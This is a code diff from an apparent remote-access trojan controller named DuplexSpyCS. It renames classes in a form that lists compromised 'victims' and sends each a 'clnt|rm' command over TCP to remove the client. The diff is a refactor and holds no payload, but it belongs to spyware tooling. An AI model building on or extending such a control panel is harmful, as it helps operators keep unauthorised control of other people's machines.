@@ -13,7 +13,7 @@ namespace DuplexSpyCS
 {
     public partial class frmClntRemove : Form
     {
-        public List<Victim> m_lsVictim;
+        public List<clsVictim> m_lsVictim;
         public Form1 frmMain;
 
         public frmClntRemove()
@@ -21,7 +21,7 @@ namespace DuplexSpyCS
             InitializeComponent();
         }
 
-        void Received(Listener listener, Victim v, string[] cmd)
+        void Received(clsTcpListener listener, clsVictim v, string[] cmd)
         {
             if (cmd[0] == "clnt") //Client
             {
@@ -30,7 +30,7 @@ namespace DuplexSpyCS
                     Invoke(new Action(() =>
                     {
                         int nCode = int.Parse(cmd[2]);
-                        string szMsg = Crypto.b64D2Str(cmd[3]);
+                        string szMsg = clsCrypto.b64D2Str(cmd[3]);
                         ListViewItem item = listView1.FindItemWithText(v.ID);
                         item.SubItems[1].Text = nCode == 1 ? "OK" : szMsg;
                     }));
@@ -47,7 +47,7 @@ namespace DuplexSpyCS
                 return;
             }
 
-            foreach (Victim v in m_lsVictim)
+            foreach (clsVictim v in m_lsVictim)
             {
                 ListViewItem item = new ListViewItem(v.ID);
                 item.SubItems.Add("?");
@@ -84,7 +84,7 @@ namespace DuplexSpyCS
             ThreadPool.SetMaxThreads(nThd, nThd);
             foreach (ListViewItem item in listView1.CheckedItems)
             {
-                Victim v = (Victim)item.Tag;
+                clsVictim v = (clsVictim)item.Tag;
                 ThreadPool.QueueUserWorkItem(x =>
                 {
                     v.SendCommand("clnt|rm");
